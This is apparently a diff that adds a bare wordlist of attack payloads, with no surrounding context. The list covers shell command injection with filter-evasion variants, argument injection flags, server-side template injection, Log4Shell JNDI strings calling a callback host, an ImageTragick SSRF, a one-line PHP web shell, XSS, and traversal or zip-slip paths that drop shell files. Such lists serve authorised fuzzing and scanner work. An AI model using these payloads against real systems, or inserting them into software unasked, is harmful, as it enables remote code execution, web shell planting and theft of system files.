@@ -1,0 +1,53 @@
+;id
+|id
+||id
+&id
+&&id
+$(id)
+`id`
+%0aid
+%0d%0aid
+';id;'
+";id;"
+|whoami
+;cat /etc/passwd
+$(cat /etc/passwd)
+`cat /etc/passwd`
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+cat</etc/passwd
+c\at /etc/passwd
+c'a't /etc/passwd
+/bin/cat$IFS/etc/passwd
+$(printf '\x69\x64')
+echo${IFS}aWQ=|base64${IFS}-d|sh
+id%09
+id%0a
+;id;#
+|id|
+--output=/tmp/x
+-o /tmp/x
+--config=/tmp/x
+--upload-pack=id
+--checkpoint-action=exec=id
+-fsSL http://callback/x
+--proxy=http://callback:8080
+--dump-config
+@file
+file:///etc/passwd
+${7*7}
+{{7*7}}
+#{7*7}
+<%= 7*7 %>
+${jndi:ldap://callback/a}
+${jndi:dns://callback/a}
+${${::-j}${::-n}${::-d}${::-i}:ldap://callback/a}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+<%= system('id') %>
+push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://callback/x)'\npop graphic-context
+<?php system($_GET['c']); ?>
+<svg onload=alert(1)>
+../../../../var/www/html/shell.php
+..\..\..\..\inetpub\wwwroot\shell.aspx
+PK../../../../var/www/html/shell.php
